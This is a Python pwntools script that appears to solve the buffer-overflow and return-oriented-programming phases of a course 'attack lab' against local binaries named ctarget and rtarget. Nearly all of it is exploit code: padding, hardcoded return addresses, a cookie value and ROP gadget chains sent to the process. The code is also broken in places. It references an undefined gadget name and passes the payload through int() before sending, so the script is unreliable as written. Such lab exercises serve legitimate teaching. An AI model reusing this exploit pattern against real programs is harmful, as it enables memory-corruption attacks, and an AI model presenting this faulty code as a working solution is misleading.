from pwn import *
import sys

def usage():
    print("python target.py <ctarget/rtarget> <1/2/3>")
    exit()

def s64(a):
    return ''.join([chr(x) for x in p64(a)])
def s32(a):
    return ''.join([chr(x) for x in p32(a)])

def run():
    padding = ''.ljust(0x28, 'A')
    touch1 = 0x4017C0
    touch2 = 0x4017EC
    pop_rdi_ret = 0x40141b
    cookie = 0x59b997fa
    cookie_addr = 0x6044E4
    validate_3_addr = 0x401931
    touch3 = 0x4018FA
    stack_addr = 0x5561dc78

    # gadget start = 0x401994 end = 0x401AB7
    # ROPgadget --binary ./rtarget --range 0x401994-0x401ab7
    mov_rdi_rax = 0x4019a2 # rdi
    pop_rax_ret = 0x4019ab # rax
    add_xy = 0x4019D6 # rax = rdi + rsi
    mov_rax_rsp = 0x401a06 # stack
    pop_rsp = 0x4019dc
    mov_esi_ecx = 0x401a13
    xchg_eax_ecx = 0x401a5f
    mov_edx_eax = 0x04019dd
    mov_ecx_edx = 0x401a69

    off_num = 0

    payload = ''
    if touch == 1:
        if 'ctarget' in pro:
            payload = padding + s64(touch1)
        else:
            print("Touch 1 only called in ctarget")
            usage()
    elif touch == 2:
        if "rtarget" in pro:
            payload = padding + s64(pop_rax_ret) + s64(cookie) + s64(mov_rdi_rax) + s64(touch2)
        elif 'ctarget' in pro:
            payload = padding + s64(pop_rdi_ret) + s64(cookie) + s64(touch2)
        else:
            usage()
    elif touch == 3:
        if "ctarget" in pro:
            padding = '59b997fa\0'.ljust(0x28, 'A')
            payload = padding + s64(pop_rdi_ret) + s64(stack_addr) + s64(touch3)
        elif "rtarget" in pro:
            off_num += 9
            payload = padding
            payload += s64(mov_eax_esp) + s64(mov_rdi_rax)
            payload += s64(pop_rax_ret) + s64(off_num * 8) + s64(mov_edx_eax)  + s64(mov_ecx_edx) + s64(mov_esi_ecx)
            payload += s64(add_xy) + s64(mov_rdi_rax)
            payload += s64(touch3)
            payload += "59b997fa\0"
            offset = len(payload)
        else:
            usage()
    else:
        usage()
    p = process(argv=[pro, '-q'])

    p.sendline(int(payload))
    p.interactive()
    # p.close()

try:
    pro = str(sys.argv[1])
    touch = int(sys.argv[2])
except :
    usage()
else:
    print(pro, touch)
    run()